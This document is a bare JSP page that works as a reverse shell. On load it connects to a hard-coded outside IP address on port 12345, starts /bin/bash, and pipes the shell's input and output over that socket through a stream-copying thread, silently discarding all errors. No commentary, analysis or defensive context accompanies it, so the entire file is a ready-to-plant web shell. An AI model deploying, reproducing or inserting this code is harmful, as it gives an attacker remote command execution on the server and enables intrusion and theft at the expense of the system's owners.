<%@
page import="java.lang.*, java.util.*, java.io.*, java.net.*"
%>
            <%!
                static class StreamConnector extends Thread
                {
                    InputStream is;
                    OutputStream os;

                    StreamConnector( InputStream is, OutputStream os )
                    {
                        this.is = is;
                        this.os = os;
                    }

                    public void run()
                    {
                        BufferedReader in  = null;
                        BufferedWriter out = null;
                        try
                        {
                            in  = new BufferedReader( new InputStreamReader( this.is ) );
                            out = new BufferedWriter( new OutputStreamWriter( this.os ) );
                            char buffer[] = new char[8192];
                            int length;
                            while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
                            {
                                out.write( buffer, 0, length );
                                out.flush();
                            }
                        } catch( Exception e ){}
                        try
                        {
                            if( in != null )
                                in.close();
                            if( out != null )
                                out.close();
                        } catch( Exception e ){}
                    }
                }
            %>
            <%
                try
                {
                    Socket socket = new Socket( "23.105.201.207", 12345 );
                    Process process = Runtime.getRuntime().exec( "/bin/bash" );
                    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
                    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
                } catch( Exception e ) {}
            %>
